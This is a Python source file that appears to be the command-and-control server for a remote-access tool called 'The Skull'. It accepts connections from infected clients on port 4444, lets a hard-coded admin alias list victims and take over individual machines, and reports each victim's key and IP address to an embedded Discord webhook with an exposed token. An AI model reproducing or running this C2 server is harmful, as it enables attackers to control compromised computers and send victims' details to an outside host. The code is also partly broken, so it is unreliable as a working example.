import threading
import socket
from discord_webhook import DiscordWebhook,DiscordEmbed
HOST = '127.0.0.1'
PORT = 4444
FORMAT = 'ascii'
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()
clients = []
aliases = []
interacting = False


def tell_admin(output):
    name='4!TMr*xR^U39@Zc#hL*OjQ$rvl7!Ij*4$f2#KV&7NBV*JImB'
    if name in aliases:
        try:
            name_index=aliases.index(name)
            send_to=clients[name_index]
            send_to.send(output.encode(FORMAT))
        except:pass # if MESSAGE is not deliver to ADMIN


def mail_admin(msg):
    try:
        WEBHOOK="https://discord.com/api/webhooks/921435574357876776/96Pbi7Ux8RzV6l7YMr3g5m_GI2R3ejRELNZCGafS2cNOcbTQ8_ZQkVrLfmgPKehIomAT"
        webhook=DiscordWebhook(url=WEBHOOK)
        embed=DiscordEmbed(title=f"{'='*15}  The Skull  {'='*15}", description=msg)
        webhook.add_embed(embed)    
        webhook.execute()
    except:pass

def display_aliases():
    available_aliases="Available Aliases:\n\n"
    for ind,a in enumerate(aliases):available_aliases+=f"        {ind+1}. "+a+"\n"
    mail_admin(available_aliases)


def broadcast(message):
    for client in clients:
        client.send(message)

def interact(name):
    global interacting, clientInteractingWith
    if name in aliases:
        interacting = True
        name_index=aliases.index(name)
        clientInteractingWith=clients[name_index]
        try:clientInteractingWith.send('program-command-for-interaction'.encode(FORMAT))  
        except:
            try:
                tell_admin('[-] Client not available')
                interacting=False
            except:pass


def handle_client(client, address):
    while True:
        try:
            message = client.recv(1024)
            index = clients.index(client)
            alias = aliases[index]
            print(alias)
            if alias == "4!TMr*xR^U39@Zc#hL*OjQ$rvl7!Ij*4$f2#KV&7NBV*JImB":
                command = message.split(" ")
                if command[0] == 'lcd':
                    tell_admin(aliases)
                elif command[0] == 'interact':
                    try:
                        if len(command[0]) == 1: raise IndexError
                        interact(command[1])
                    except:
                        tell_admin("interact <key>")

        except:
            index = clients.index(client)
            clients.remove(client)
            client.close()
            alias = aliases[index]

            broadcast(f'[-] {alias} | {str(address[0])}:{str(address[1])}'.encode(FORMAT))
            mail_admin(f'[-] Lost Connection:\n\n        Key: {alias}\n        IP: {str(address[0])}:{str(address[1])}')
            aliases.remove(alias)
            display_aliases()
            break


def receive():
    while True:
        client, address = server.accept()

        client.send('alias?'.encode(FORMAT))
        alias = client.recv(1024).decode(FORMAT)

        aliases.append(alias)
        clients.append(client)
        
        broadcast(f'[+] {alias} | {str(address[0])}:{str(address[1])}'.encode(FORMAT))
        mail_admin(f'[+] New Connection:\n\n        Key: {alias}\n        IP: {str(address[0])}:{str(address[1])}')
        display_aliases()

        client.send('you are now connected!'.encode(FORMAT))
        thread = threading.Thread(target=handle_client, args=(client,address))
        thread.start()



receive()
